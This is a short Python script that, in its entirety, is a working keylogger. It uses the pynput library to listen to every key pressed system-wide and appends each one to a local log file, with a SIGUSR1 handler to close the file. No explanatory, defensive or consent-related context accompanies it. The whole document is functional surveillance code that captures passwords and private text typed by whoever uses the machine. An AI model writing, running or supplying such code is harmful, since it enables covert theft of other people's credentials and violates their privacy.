#!/usr/bin/env python3

from pynput import keyboard
import signal

file = open("log/log_file.txt", "w")

def exit_manage(signum, stack):
    file.close()

signal.signal(signal.SIGUSR1, exit_manage)

def get_key(key):
    if isinstance(key, keyboard.KeyCode):
        return key.char
    else:
        return str(key)



def press(key):
    key_name = get_key(key)
    file.write('Message: {}\n'.format(key_name))


with keyboard.Listener(on_press=press) as listener:
    listener.join()
